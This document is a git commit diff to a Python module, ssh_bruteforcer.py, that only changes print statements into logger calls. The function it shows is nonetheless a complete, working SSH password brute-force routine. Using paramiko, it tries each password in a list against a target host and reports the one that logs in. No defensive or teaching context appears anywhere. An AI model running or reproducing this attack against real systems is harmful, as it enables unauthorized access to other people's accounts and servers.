ccdac7528b34ce47c6192f08e10f242c06908d81
Yashvardhan Singh <chanchalyashsingh2005@gmail.com>
2025-07-19 21:41:38 +0530

    Update ssh_bruteforcer.py

--- modules/ssh_bruteforcer.py
+++ modules/ssh_bruteforcer.py
@@ -1,15 +1,15 @@
 import paramiko
+from utils import logger
 
 def ssh_brute_force(host, username, password_list):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
     for password in password_list:
         try:
             client.connect(hostname=host, username=username, password=password, timeout=3)
-            print(f"[+] Password Found: {password}")
+            logger.info(f"Password Found: {password}")
             return
         except paramiko.AuthenticationException:
-            print(f"[-] Wrong password: {password}")
+            logger.warn(f"Wrong password: {password}")
         except Exception as e:
-            print(f"[!] Error: {e}")
+            logger.error(f"Error: {e}")
